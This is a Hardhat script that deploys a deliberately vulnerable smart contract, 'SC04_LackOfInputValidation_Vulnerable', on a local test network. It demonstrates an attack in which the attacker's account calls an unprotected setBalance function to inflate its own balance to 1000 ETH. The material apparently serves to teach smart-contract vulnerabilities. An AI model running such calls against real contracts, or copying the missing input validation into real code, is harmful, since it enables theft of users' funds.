const { ethers } = require("hardhat");
const fs = require("fs");
const path = require("path");

async function main() {
  console.log(
    "🚀 Initiating attack on SC04_LackOfInputValidation_Vulnerable..."
  );

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();

  console.log(`Deployer Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. DEPLOY THE CONTRACT ---
  console.log("\nDeploying contract...");
  const Contract = await ethers.getContractFactory(
    "SC04_LackOfInputValidation_Vulnerable"
  );
  const contract = await Contract.deploy();
  await contract.waitForDeployment();
  console.log(`🎯 Target Contract Address: ${contract.target}`);

  // --- 3. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking attacker's balance before the attack...");
  let attackerBalance = await contract.balances(attacker.address);
  console.log(`   - Attacker's balance: ${attackerBalance}`);

  console.log("\n💥 ATTACKING: Setting attacker's balance to a high value...");
  const tx = await contract
    .connect(attacker)
    .setBalance(attacker.address, ethers.parseEther("1000"));
  await tx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking attacker's balance after the attack...");
  attackerBalance = await contract.balances(attacker.address);
  console.log(
    `   - Attacker's balance: ${ethers.formatEther(attackerBalance)} ETH`
  );

  if (attackerBalance > 0) {
    console.log(
      "\n🎉 SUCCESS: The attacker has successfully inflated their balance!"
    );
  } else {
    console.log("\n😞 FAILED: The attacker could not inflate their balance.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
